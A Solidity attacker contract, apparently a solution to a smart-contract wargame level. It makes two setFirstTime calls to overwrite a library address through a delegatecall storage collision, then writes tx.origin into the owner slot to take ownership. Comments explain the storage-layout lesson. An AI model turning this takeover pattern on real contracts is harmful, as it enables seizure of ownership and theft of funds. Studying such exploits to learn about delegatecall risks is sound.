// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITimeZone {
    function setFirstTime(uint _timestamp) external;
}

contract timeZoneTakeOver {
    // Main takeaway is the order and matching of variables in the contracts.
    // In library variables are missing and allow us to set a new timeZone1Library-address.
    // downgraded to solidity 6 to have easier casting of different types.

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    ITimeZone timeZone;

    constructor(address _timeZone) public {
        timeZone = ITimeZone(_timeZone);
    }

    // This function was not needed. Simply needed to call manually. 
    function initiateTakeOver() public {
        uint addr = uint(address(this));
        uint _owner = uint(tx.origin);
        timeZone.setFirstTime(addr);
        timeZone.setFirstTime(_owner);
        // timeZone.delegatecall(abi.encodePacked(setTimeSignature, addr));
        // timeZone.delegatecall(abi.encodePacked(setTimeSignature, uint(25)));
    }

    function setTime(uint _owner) public {
        owner = address(_owner);
    }
}